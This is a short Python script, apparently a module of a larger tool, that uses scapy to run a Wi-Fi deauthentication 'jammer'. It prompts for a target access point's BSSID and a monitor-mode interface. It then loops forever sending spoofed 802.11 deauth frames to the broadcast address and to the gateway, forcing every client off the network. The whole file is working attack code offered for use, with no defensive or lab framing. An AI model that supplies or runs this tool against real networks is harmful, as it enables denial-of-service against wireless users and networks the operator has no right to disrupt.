from colorama import Fore, Back, Style, init
from scapy.all import *
import time
import sys

def wifi_jammer():
    init(autoreset=True)

    print(Fore.CYAN + "\n--- Wi-Fi Broadcast Jammer Module ---")
    getaway_mac = input(Fore.YELLOW + "Enter Target Gateway MAC Address (BSSID): ").strip()
    interface = input(Fore.YELLOW + "Enter Monitor Mode Interface Name (e.g., wlan0mon): ").strip()
    brodcast_mac = "ff:ff:ff:ff:ff:ff"

    if not getaway_mac or not interface:
        print(Fore.RED + "[-] Error: MAC address or interface cannot be empty!")
        return False

    try:

        pkg_for_clients = RadioTap() / Dot11(addr1=brodcast_mac, addr2=getaway_mac, addr3=getaway_mac) / Dot11Deauth(reason=7)
        

        pkg_for_ap = RadioTap() / Dot11(addr1=getaway_mac, addr2=brodcast_mac, addr3=getaway_mac) / Dot11Deauth(reason=7)

        print(Fore.BLUE + f"\n[+] Wi-Fi Jammer Started. Target: {getaway_mac}")
        print(Fore.BLUE + "[!] Press CTRL+C to stop the attack...\n")

        while True:
            try:

                sendp(pkg_for_clients, iface=interface, count=5, verbose=False)
                sendp(pkg_for_ap, iface=interface, count=5, verbose=False)
                print(Fore.GREEN + "[*] Wi-Fi Jammer Packets Successfully Transmitted...")
                time.sleep(0.1)
            except KeyboardInterrupt:
                print(Fore.RED + "\n[-] Wi-Fi Jammer Stopped by User.")
                return False
            except Exception as e:
                print(Fore.RED + f"\n[-] Error during execution: {e}")
                return False
    except Exception as e:
        print(Fore.RED + f"[-] Initialization Error: {e}")
        return False
